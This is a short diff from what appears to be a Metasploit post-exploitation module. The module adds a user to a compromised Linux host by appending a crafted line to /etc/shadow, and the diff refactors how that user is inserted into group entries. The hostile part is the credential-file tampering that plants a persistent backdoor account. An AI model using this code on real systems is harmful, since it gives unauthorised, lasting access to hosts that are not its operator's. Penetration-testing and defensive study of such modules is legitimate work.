@@ -224,8 +224,11 @@ class MetasploitModule < Msf::Post
       d_cmd_exec("echo \'#{datastore['USERNAME']}:#{passwd}:#{Time.now.to_i / 86400}:0:99999:7:::\' >> /etc/shadow")
       group_file_save = group_file
 
-      groups.select do |group|
-        group_file = group_file.gsub(/^(#{group}:[^:]*:[0-9]+:.+)$/, "\\1,#{datastore['USERNAME']}").gsub(/^(#{group}:[^:]*:[0-9]+:)$/, "\\1#{datastore['USERNAME']}")
+      groups.each do |group|
+        # Add user to group if there are other users
+        group_file = group_file.gsub(/^(#{group}:[^:]*:[0-9]+:.+)$/, "\\1,#{datastore['USERNAME']}")
+        # Add user to group of no users belong to that group yet
+        group_file = group_file.gsub(/^(#{group}:[^:]*:[0-9]+:)$/, "\\1#{datastore['USERNAME']}")
       end
       if datastore['MissingGroups'] == 'CREATE'
         groups_missing.each do |group|
